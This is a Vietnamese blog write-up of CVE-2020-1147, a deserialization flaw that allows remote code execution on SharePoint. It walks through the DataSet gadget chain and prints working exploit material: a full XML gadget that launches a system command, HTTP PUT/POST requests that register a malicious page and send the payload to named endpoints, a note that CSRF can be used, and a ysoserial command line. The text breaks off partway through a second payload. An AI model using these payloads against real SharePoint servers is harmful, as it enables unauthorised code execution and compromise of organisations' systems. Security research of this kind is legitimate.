---
title: Lỗi CVE-2020-1147
date: 24/7/2021
layout: single
header:
  teaser: /assets/images/cve.PNG
---

## SharePoint và Pwn :: Thực thi mã từ xa chống lại máy chủ SharePoint lạm dụng DataSet

## SharePoint là gì?

SharePoint là nền tảng quản lý tài liệu và cộng tác dựa trên web. Mặc dù rất linh hoạt, SharePoint chủ yếu được sử dụng để lưu trữ tài liệu và giao tiếp thông tin giữa các doanh nghiệp.

Với SharePoint, người dùng có thể tạo mạng nội bộ (hoặc hệ thống internet nội bộ) hoạt động giống như bất kỳ trang web nào khác. Các trang con có thể được tạo cho các phòng ban hoặc nhóm cụ thể. Thông qua không gian tập trung, bảo mật này, người dùng có thể truy cập, chia sẻ và chỉnh sửa tài liệu.

![](https://vinsep.com/wp-content/uploads/2021/04/SharePoint-Infographic.jpg)

## Mô Tả 
Khi [CVE-2020-1147](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1147) được phát hành vào tuần trước, tôi đã tò mò không biết lỗ hổng này biểu hiện như thế nào và làm thế nào kẻ tấn công có thể thực hiện mã từ xa với nó

 Tôi chia sẻ sự cố của CVE-2020-1147 được phát hiện độc lập bởi [Oleksandr Mirosh](https://twitter.com/olekmirosh) ,[Markus Wulftange](https://twitter.com/mwulftange) và [Jonathan Birch](https://www.linkedin.com/in/jonathan-birch-ab27681/) 

 Một trong những điều nổi bật đối với tôi, đó là Microsoft đã xuất bản Quy tắc [bảo mật](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance) liên quan đến lỗi này, trích lời Microsoft:
 
 + Nếu dữ liệu XML đến chứa một đối tượng có kiểu không có trong danh sách này… Một ngoại lệ sẽ được ném ra. Hoạt động giải mã không thành công. Khi tải XML vào phiên bản DataSet hoặc DataTable hiện có, các định nghĩa cột hiện có cũng được tính đến. Nếu bảng đã chứa định nghĩa cột của một kiểu tùy chỉnh, thì kiểu đó sẽ tạm thời được thêm vào danh sách cho phép trong suốt thời gian hoạt động giải mã XML.

Điều thú vị là có thể chỉ định các loại và có thể ghi đè các định nghĩa cột. Đó là món quà quan trọng đối với tôi, hãy xem cách `DataSet` đối tượng được tạo ra:

## DataSet
A `DataSet` chứa a `Datatable` với `DataColumn`(s) và `DataRow`(s). Quan trọng hơn, nó thực hiện `ISerializablegiao` diện có nghĩa là nó có thể được tuần tự hóa với `XmlSerializer`. Hãy bắt đầu bằng cách tạo `DataTable`:

```cs
  static void Main(string[] args)
        {
            // instantiate the table
            DataTable exptable = new DataTable("exp table");
			
            // make a column and set type information and append to the table
            DataColumn dc = new DataColumn("ObjectDataProviderCol");
            dc.DataType = typeof(ObjectDataProvider);
            exptable.Columns.Add(dc);
			
            // make a row and set an object instance and append to the table
            DataRow row = exptable.NewRow();
            row["ObjectDataProviderCol"] = new ObjectDataProvider();
            exptable.Rows.Add(row);
			
            // dump the xml schema
            exptable.WriteXmlSchema("c:/poc-schema.xml");
        }		
```
Sử dụng phương thức `WriteXmlSchema`, Có thể viết ra định nghĩa giản đồ. Mã đó tạo ra như sau:

```xml
<?xml version="1.0" standalone="yes"?>
<xs:schema id="NewDataSet" xmlns="" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
  <xs:element name="NewDataSet" msdata:IsDataSet="true" msdata:MainDataTable="exp_x0020_table" msdata:UseCurrentLocale="true">
    <xs:complexType>
      <xs:choice minOccurs="0" maxOccurs="unbounded">
        <xs:element name="exp_x0020_table">
          <xs:complexType>
            <xs:sequence>
              <xs:element name="ObjectDataProviderCol" msdata:DataType="System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" type="xs:anyType" minOccurs="0" />
            </xs:sequence>
          </xs:complexType>
        </xs:element>
      </xs:choice>
    </xs:complexType>
  </xs:element>
</xs:schema>
```
Nhìn vào mã của `DataSet`, nó tiết lộ rằng nó tiết lộ các phương pháp tuần tự hóa của riêng mình (được bọc lại `XmlSerializer`) bằng cách sử dụng `WriteXml` và `ReadXML`:

```shell
System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
  System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
    System.Data.XmlDataLoader.LoadData(XmlReader reader)
      System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
        System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
          System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
            System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
              System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
```
Bây giờ, tất cả những gì còn lại cần làm là thêm bảng vào tập dữ liệu và tuần tự hóa nó:

```cs
 DataSet ds = new DataSet("poc");
            ds.Tables.Add(exptable);
            using (var writer = new StringWriter())
            {
                ds.WriteXml(writer);
                Console.WriteLine(writer.ToString());
            }
```
Các phương pháp tuần tự hóa này giữ lại các loại lược đồ và tái tạo lại các loại bị ảnh hưởng bởi kẻ tấn công trong thời gian chạy bằng cách sử dụng một `DataSet` loại dự kiến duy nhất trong `XmlSerializerbiểu` đồ đối tượng được khởi tạo 

## Tiện ích DataSet
Dưới đây là một ví dụ về một tiện ích có thể được chế tạo như vậy, lưu ý rằng điều này không được nhầm lẫn với các `DataSet` tiện ích trong `ysoserial` 

```xml
<DataSet>
  <xs:schema xmlns="" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="somedataset">
    <xs:element name="somedataset" msdata:IsDataSet="true" msdata:UseCurrentLocale="true">
      <xs:complexType>
        <xs:choice minOccurs="0" maxOccurs="unbounded">
          <xs:element name="Exp_x0020_Table">
            <xs:complexType>
              <xs:sequence>
                <xs:element name="pwn" msdata:DataType="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" type="xs:anyType" minOccurs="0"/>
              </xs:sequence>
            </xs:complexType>
          </xs:element>
        </xs:choice>
      </xs:complexType>
    </xs:element>
  </xs:schema>
  <diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">
    <somedataset>
      <Exp_x0020_Table diffgr:id="Exp Table1" msdata:rowOrder="0" diffgr:hasChanges="inserted">
        <pwn xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
          <ExpandedElement/>
          <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
              <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string"><![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider x:Key="LaunchCmd" ObjectType="{x:Type Diag:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><System:String>cmd</System:String><System:String>/c mspaint </System:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]></anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"/>
          </ProjectedProperty0>
        </pwn>
      </Exp_x0020_Table>
    </somedataset>
  </diffgr:diffgram>
</DataSet>
```
Chuỗi tiện ích này sẽ gọi một phương thức tĩnh tùy ý trên một phương thức `Type` không chứa thành viên giao diện. Ở đây tôi đã sử dụng khét tiếng `XamlReader.Parse` để tải Xaml độc hại để thực thi một lệnh hệ thống. Tác giả  đã sử dụng ExpandedWrapper lớp để tải hai loại khác nhau như đã được đề cập trong nghiên cứu tuyệt vời của [pwntester](https://twitter.com/pwntester) 

Nó có thể được tận dụng trong một số điểm chìm, chẳng hạn như:

```cs
XmlSerializer ser = new XmlSerializer(typeof(DataSet));
Stream reader = new FileStream("c:/poc.xml", FileMode.Open);
ser.Deserialize(reader);
```
Nhiều ứng dụng được coi `DataSetlà` an toàn, vì vậy ngay cả khi loại mong đợi không thể được kiểm soát trực tiếp `XmlSerializer`, `DataSet` vẫn thường được sử dụng trong biểu đồ đối tượng. Tuy nhiên, điểm nhấn thú vị nhất là `DataSet.ReadXml` kích hoạt thực thi mã:

```cs
DataSet ds = new DataSet();
ds.ReadXml("c:/poc.xml");	
```
## Áp dụng Tiện ích cho Máy chủ SharePoint
Nếu chúng ta xem xét [ZDI-20-874](https://www.zerodayinitiative.com/advisories/ZDI-20-874/) , tư vấn đề cập đến `Microsoft.PerformancePoint.Scorecards.Client.ExcelDataSet` điều khiển có thể được tận dụng để thực thi mã từ xa. Điều này ngay lập tức cản trở sự quan tâm của tôi vì nó có tên (DataSet) trong tên lớp của nó. Hãy xem tệp web.config mặc định của SharePoint:

```xml
 <controls>
        <add tagPrefix="asp" namespace="System.Web.UI" assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
        <add tagPrefix="SharePoint" namespace="Microsoft.SharePoint.WebControls" assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" />
        <add tagPrefix="WebPartPages" namespace="Microsoft.SharePoint.WebPartPages" assembly="Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" />
        <add tagPrefix="PWA" namespace="Microsoft.Office.Project.PWA.CommonControls" assembly="Microsoft.Office.Project.Server.PWA, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" />
        <add tagPrefix="spsswc" namespace="Microsoft.Office.Server.Search.WebControls" assembly="Microsoft.Office.Server.Search, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" />
      </controls>
```
Trong thẻ điều khiển, chúng ta có thể thấy rằng tiền tố không tồn tại cho `Microsoft.PerformancePoint.Scorecards` không gian tên. Tuy nhiên, nếu chúng tôi kiểm tra các thẻ SafeControl, nó thực sự được liệt kê với tất cả các loại từ không gian tên đó được phép

```xml
<configuration>
  <configSections>
  <SharePoint>
    <SafeControls>
      <SafeControl Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" Namespace="Microsoft.PerformancePoint.Scorecards" TypeName="*" />
```
Bây giờ chúng ta biết chúng ta có thể khởi tạo các lớp từ không gian tên đó, hãy đi sâu vào mã để kiểm tra `ExcelDataSet` kiểu 

```cs
namespace Microsoft.PerformancePoint.Scorecards
{

	[Serializable]
	public class ExcelDataSet
	{
```
Điều đầu tiên tôi nhận thấy là nó có thể tuần tự hóa, vì vậy tôi biết rằng nó có thể được khởi tạo dưới dạng điều khiển và phương thức khởi tạo mặc định sẽ được gọi cùng với bất kỳ bộ thiết lập công khai nào không được đánh dấu bằng System.Xml.`Serialization.XmlIgnoreAttribute` thuộc tính. SharePoint sử dụng `XmlSerializer` để tạo các đối tượng từ các điều khiển để bất kỳ nơi nào trong mã nơi dữ liệu được cung cấp của kẻ tấn công có thể được truyền vào `TemplateControl.ParseControl`, `ExcelDataSet` loại có thể được tận dụng.

Một trong những thuộc tính nổi bật là thuộc `DataTable` tính vì nó chứa một bộ thiết lập công khai và sử dụng kiểu `System.Data.DataTable`. Tuy nhiên, khi kiểm tra kỹ hơn, chúng tôi có thể thấy rằng `XmlIgnore` thuộc tính này đang được sử dụng, vì vậy chúng tôi không thể kích hoạt quá trình deserialization bằng cách sử dụng bộ thiết lập này.

```cs
[XmlIgnore]
public DataTable DataTable
{
	get
	{
		if (this.dataTable == null && this.compressedDataTable != null)
		{
			this.dataTable = (Helper.GetObjectFromCompressedBase64String(this.compressedDataTable, ExcelDataSet.ExpectedSerializationTypes) as DataTable);
			if (this.dataTable == null)
			{
				this.compressedDataTable = null;
			}
		}
		return this.dataTable;
	}
	set
	{
		this.dataTable = value;
		this.compressedDataTable = null;
	}
}
```

Tuy nhiên, đoạn mã trên tiết lộ câu trả lời một phần, getter gọi `GetObjectFromCompressedBase64String` bằng cách sử dụng thuộc `compressedDataTable` tính. Phương thức này sẽ giải mã base64 được cung cấp, giải nén tải trọng định dạng nhị phân và gọi `BinaryFormatter.Deserialize` với nó. Tuy nhiên, mã chứa các kiểu dự kiến ​​cho quá trình giải mã hóa, một trong số đó là DataTable, Vì vậy, chúng ta không thể chỉ nhồi một [TypeConfuseDelegate](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs) đã tạo ở đây.

```cs
private static readonly Type[] ExpectedSerializationTypes = new Type[]
		{
			typeof(DataTable),
			typeof(Version)
		};
```
Kiểm tra thuộc `CompressedDataTable` tính, chúng tôi có thể thấy rằng chúng tôi không có vấn đề gì khi thiết lập `compressedDataTable` thành viên vì nó đang sử dụng `System.Xml.Serialization.XmlElementAttribute` thuộc tính.
```cs
[XmlElement]
public string CompressedDataTable
{
	get
	{
		if (this.compressedDataTable == null && this.dataTable != null)
		{
			this.compressedDataTable = Helper.GetCompressedBase64StringFromObject(this.dataTable);
		}
		return this.compressedDataTable;
	}
	set
	{
		this.compressedDataTable = value;
		this.dataTable = null;
	}
}
```
Đặt nó (gần như tất cả) lại với nhau, tôi có thể đăng ký một tiền tố và khởi tạo điều khiển với một base64 được mã hóa, nén và tuần tự hóa, mặc dù rất nguy hiểm `DataTable`

```shell
PUT /poc.aspx HTTP/1.1
Host: <target>
Authorization: <ntlm auth header>
Content-Length: 1688

<%@ Register TagPrefix="escape" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"%>
<escape:ExcelDataSet runat="server" CompressedDataTable="H4sIAAAAAAAEALVWW2/bNhROegmadtvbHvYm6KFPtmTHSdoqlgs06YZgcRPE2RqgKDKaOrbZSKRGUraMYv9o+43doUTZju2mabHJgESfOw+/80kbmxsbG5/wMk9zfXcPb296U6Uh8Y6IJjXnd5CKCR7ueg3zqzmHWawzCSGHTEsS15yzrB8z+itML8Q18LD/7BnZo3v7zRetXWg8f/HQBP9xIWZxuyD9GO6j5qfZP+8cEqEZH9qU25dJ3KMjSMgTXB2xweAXSZL7m5s/2GDWztS8bUJtPcDb34/aL/Mkdsa2brfpNVwHOBURhg7dTA/qzX33Zef7x+1cBapI4KAHV6Hrlosgx/VI6zTw/clk4k1anpBDf6fRaPqX3ZOyqMo2URHuAANLbqOpesKoFEoMdJ2KJEC7emnlYlbHMXkhhgS4djhJIHRf5+lV3mjsNK6KTpRmpSEGSGPIL6YpWGkpV/BnhruaC9fFTSfcdcrUQdFnjBK6i2fRAzlmFJR3zDVITmIPayE8guitJGkK8o+dd++sw1vGIzFRXpfI6yz1LkkSnwOJQCIGJChMSzS2/Gc8JZgIef0N4Gk1+4PW8719ErX2d6G19762nLyo+rT/Aag2yzMpxuz/LeF9zVnXsf9gNFxHFweC50b41BzO7LQ0kUPQb3AbKiUUDDQTxk8pzSRiExHtz9Hgr8KhkC1DpxBagHwGiEokYPIr0LNSjpXZdw906GqZzUvsEsZnw7uK4crsNwWHmZSY40RQYiyLKHeAOB0JbPTSvhOSV/8y3heZgeq8G3fZd9mvYlI7Ww+RMv553I6QXYYyKB8k+ZbRtj5liC/5VInq46blhIXOV3tZ6qhji2RR0WynEDZnfZZicipxEoouWdMRUYcjwoeA3WJcgdTYrHmPkR5mhMe+zHh1DKEJgmxOk9EdeHKRoSpyeW1R5y8qcZbNWEOEC2QePW0saFFfTv2xLcLBmoNyfuZM5N6IiD5d0CMRmTnqnBGpoO0vSNZYohFqkArVDS3q7YQupMXtB0pLfK24naexPjgHJTJJ4YhRQ0JETqv3iu2RxYM3w4OHePAnjA9y07R9P8eN+OkCkc06/XUxKreSt0KXxrLOKy6x0gOiFCT9eBomigoZs37ldcTIcL2PZ1RcKM2omvurQuc+HeoD04ZVcnbyADkwdE9IxunoMMGBLY3K99HHPCg6a4IH6IPkqv5ynflB4SsL+VDfksFbPr3KtKw76BXHZIQ0iYzcX1Gstfapg5xFnc+7+F9RzBrbmWoVPEbV9i3sbmLVvwWsbf+WOWr7OPMzrlwiGEuWN5mo7S9xY+eB+dZa+gYzX15bV13yQUh8MG4erzIWR9tX5zBmxsR8Xz7C65791vxkryf/AlZRMe+GCgAA" />
```

Tuy nhiên, tác giả  không thể tìm ra cách để kích hoạt việc nhận `DataTable` tài sản. Tôi biết tôi cần một cách để sử dụng DataSet, nhưng tôi cũng không biết làm thế nào .

## Nhiều con đường dẫn đến Rome
Sự hợp nhất! Sau khi đi dạo với con chó của mình, tôi quyết định nghĩ về điều này theo cách khác và tôi tự hỏi bản thân mình có những loại bồn rửa nào khác. Sau đó, tôi nhớ rằng `DataSet.ReadXml` bồn rửa cũng là một nguồn gây ra sự cố, vì vậy tôi đã kiểm tra lại mã và tìm thấy đường dẫn mã hợp lệ này:

```txt
Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetDataSet()
  Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.PopulateDataSetFromCache(DataSet)
```
Bên trong `ContactLinksSuggestionsMicroView` lớp, chúng ta có thể thấy `GetDataSet` phương thức:

```cs
	protected override DataSet GetDataSet()
		{
			base.StopProcessingRequestIfNotNeeded();
			if (!this.Page.IsPostBack || this.Hidden)                                                                       // 1
			{
				return null;
			}
			DataSet dataSet = new DataSet();
			DataTable dataTable = dataSet.Tables.Add();
			dataTable.Columns.Add("PreferredName", typeof(string));
			dataTable.Columns.Add("Weight", typeof(double));
			dataTable.Columns.Add("UserID", typeof(string));
			dataTable.Columns.Add("Email", typeof(string));
			dataTable.Columns.Add("PageURL", typeof(string));
			dataTable.Columns.Add("PictureURL", typeof(string));
			dataTable.Columns.Add("Title", typeof(string));
			dataTable.Columns.Add("Department", typeof(string));
			dataTable.Columns.Add("SourceMask", typeof(int));
			if (this.IsInitialPostBack)                                                                                      // 2
			{
				this.PopulateDataSetFromSuggestions(dataSet);
			}
			else
			{
				this.PopulateDataSetFromCache(dataSet);                                                                  // 3
			}
			this.m_strJavascript.AppendLine("var user = new Object();");
			foreach (object obj in dataSet.Tables[0].Rows)
			{
				DataRow dataRow = (DataRow)obj;
				string scriptLiteralToEncode = (string)dataRow["UserID"];
				int num = (int)dataRow["SourceMask"];
				this.m_strJavascript.Append("user['");
				this.m_strJavascript.Append(SPHttpUtility.EcmaScriptStringLiteralEncode(scriptLiteralToEncode));
				this.m_strJavascript.Append("'] = ");
				this.m_strJavascript.Append(num.ToString(CultureInfo.CurrentCulture));
				this.m_strJavascript.AppendLine(";");
			}
			StringWriter stringWriter = new StringWriter(CultureInfo.CurrentCulture);
			dataSet.WriteXml(stringWriter);
			SPPageContentManager.RegisterHiddenField(this.Page, "__SUGGESTIONSCACHE__", stringWriter.ToString());
			return dataSet;
		}
```

Bên trong `PopulateDataSetFromCache`, mã gọi `SPRequestParameterUtility.GetValue` để lấy dữ liệu do kẻ tấn công kiểm soát từ `__SUGGESTIONSCACHE__` biến yêu cầu và phân tích cú pháp trực tiếp để `ReadXml` sử dụng `XmlTextReader`. Lược đồ đã xác định trước đó bị ghi đè bằng lược đồ do kẻ tấn công cung cấp bên trong XML được cung cấp và việc giải mã các kiểu không đáng tin cậy xảy ra  , dẫn đến việc thực thi mã từ xa . Để kích hoạt điều này, tôi đã tạo một trang sử dụng `ContactLinksSuggestionsMicroView` loại cụ thể:

```shell
PUT /poc.aspx HTTP/1.1
Host: <target>
Authorization: <ntlm auth header>
Content-Length: 252

<%@ Register TagPrefix="escape" Namespace="Microsoft.SharePoint.Portal.WebControls" Assembly="Microsoft.SharePoint.Portal, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"%>
<escape:ContactLinksSuggestionsMicroView runat="server" />
```

Nếu bạn đang khai thác lỗi này với tư cách là một người dùng có quyền kiểm soát thấp và `AddAndCustomizePages` cài đặt bị vô hiệu hóa, thì bạn có thể khai thác lỗi này với các trang khởi tạo `InputFormContactLinksSuggestionsMicroView` kiểm soát, vì nó mở rộng từ `ContactLinksSuggestionsMicroView`

```cs
namespace Microsoft.SharePoint.Portal.WebControls
{

	[SharePointPermission(SecurityAction.Demand, ObjectModel = true)]
	[AspNetHostingPermission(SecurityAction.LinkDemand, Level = AspNetHostingPermissionLevel.Minimal)]
	[AspNetHostingPermission(SecurityAction.InheritanceDemand, Level = AspNetHostingPermissionLevel.Minimal)]
	[SharePointPermission(SecurityAction.InheritanceDemand, ObjectModel = true)]
	public class InputFormContactLinksSuggestionsMicroView : ContactLinksSuggestionsMicroView
	{
```
Tôi đã tìm thấy một vài điểm cuối triển khai kiểm soát đó (nhưng tôi chưa có thời gian để kiểm tra chúng)Cập nhật: Soroush Dalili đã thử nghiệm chúng cho tôi và xác nhận rằng chúng thực sự có thể khai thác được.
+ /_layouts/15/quicklinks.aspx?Mode=Suggestion
+  /_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion

Bây giờ, để khai thác nó, chúng tôi có thể thực hiện một yêu cầu đăng lên trang mới được tạo của tác giả:

```shell
POST /poc.aspx HTTP/1.1
Host: <target>
Authorization: <ntlm auth header>
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>

__viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
```
hoặc
```shell
POST /quicklinks.aspx?Mode=Suggestion HTTP/1.1
Host: <target>
Authorization: <ntlm auth header>
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>

__viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
```
hoặc 
```shell
POST /quicklinksdialogform.aspx?Mode=Suggestion HTTP/1.1
Host: <target>
Authorization: <ntlm auth header>
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>

__viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
```
Lưu ý rằng mỗi điểm cuối này cũng có thể là csrfed, do đó, thông tin xác thực không nhất thiết phải có.

## Điều cuối cùng 
Bạn không thể sử dụng `XamlReader.Load` phương pháp tĩnh vì máy chủ web IIS đang mạo danh là tài khoản IUSR và tài khoản đó có quyền truy cập hạn chế vào sổ đăng ký. Nếu bạn cố gắng, bạn sẽ kết thúc với một dấu vết ngăn xếp như thế này trừ khi bạn tắt tính năng mạo danh trong IIS và sử dụng danh tính nhóm ứng dụng:

```shell
{System.InvalidOperationException: There is an error in the XML document. ---> System.TypeInitializationException: The type initializer for 'MS.Utility.EventTrace' threw an exception. ---> System.Security.SecurityException: Requested registry access is not allowed.
   at System.ThrowHelper.ThrowSecurityException(ExceptionResource resource)
   at Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable)
   at Microsoft.Win32.RegistryKey.OpenSubKey(String name)
   at Microsoft.Win32.Registry.GetValue(String keyName, String valueName, Object defaultValue)
   at MS.Utility.EventTrace.IsClassicETWRegistryEnabled()
   at MS.Utility.EventTrace..cctor()
   --- End of inner exception stack trace ---
   at MS.Utility.EventTrace.EasyTraceEvent(Keyword keywords, Event eventID, Object param1)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode, Boolean useRestrictiveXamlReader, List`1 safeTypes)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode, Boolean useRestrictiveXamlReader)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader, ParserContext parserContext, XamlParseMode parseMode)
   at System.Windows.Markup.XamlReader.Load(XmlReader reader)
   at System.Windows.Markup.XamlReader.Parse(String xamlText)
   --- End of inner exception stack trace ---
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader, String encodingStyle, XmlDeserializationEvents events)
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader, String encodingStyle)
   at System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
   at System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
   at System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
   at System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
   at System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
   at System.Data.XmlDataLoader.LoadData(XmlReader reader)
   at System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
   at System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
   at System.Data.DataSet.ReadXml(XmlReader reader)
   at Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.PopulateDataSetFromCache(DataSet ds)
   at Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetDataSet()
   at Microsoft.SharePoint.Portal.WebControls.PrivacyItemView.GetQueryResults(Object obj)
```
Bạn cần tìm một phương thức tĩnh nguy hiểm khác hoặc bộ cài đặt để gọi từ một loại không sử dụng các thành viên giao diện, Tôi để đây như một bài tập cho người đọc, chúc bạn may mắn!


## Khai Thác thực thi mã từ xa

+ Mã khai thác [CVE-2020-1147](https://www.exploit-db.com/exploits/50151)

 Hãy nhìn sự thật là, tôi chỉ muốn mọi người đọc toàn bộ bài đăng trên blog và không vội vàng tìm kiếm tải trọng khai thác, tốt hơn là bạn nên hiểu công nghệ cơ bản mà bạn biết không? Dù sao, để khai thác lỗi này, chúng ta có thể (ab) sử dụng `LosFormatter.Deserialize` phương thức này vì lớp không chứa các thành viên giao diện. Để làm như vậy, chúng ta cần tạo một trọng tải base64 của một `ObjectStateFormatter` chuỗi tiện ích được tuần tự hóa 
 
 ```powershell
 c:\> ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c mspaint
 ```
Bây giờ, chúng ta có thể cắm tải trọng vào tiện ích DataSet sau và kích hoạt thực thi mã từ xa đối với Máy chủ SharePoint đích!

```xml
<DataSet>
  <xs:schema xmlns="" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="somedataset">
    <xs:element name="somedataset" msdata:IsDataSet="true" msdata:UseCurrentLocale="true">
      <xs:complexType>
        <xs:choice minOccurs="0" maxOccurs="unbounded">
          <xs:element name="Exp_x0020_Table">
            <xs:complexType>
              <xs:sequence>
                <xs:element name="pwn" msdata:DataType="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" type="xs:anyType" minOccurs="0"/>
              </xs:sequence>
            </xs:complexType>
          </xs:element>
        </xs:choice>
      </xs:complexType>
    </xs:element>
  </xs:schema>
  <diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">
    <somedataset>
      <Exp_x0020_Table diffgr:id="Exp Table1" msdata:rowOrder="0" diffgr:hasChanges="inserted">
        <pwn xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Deserialize</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" 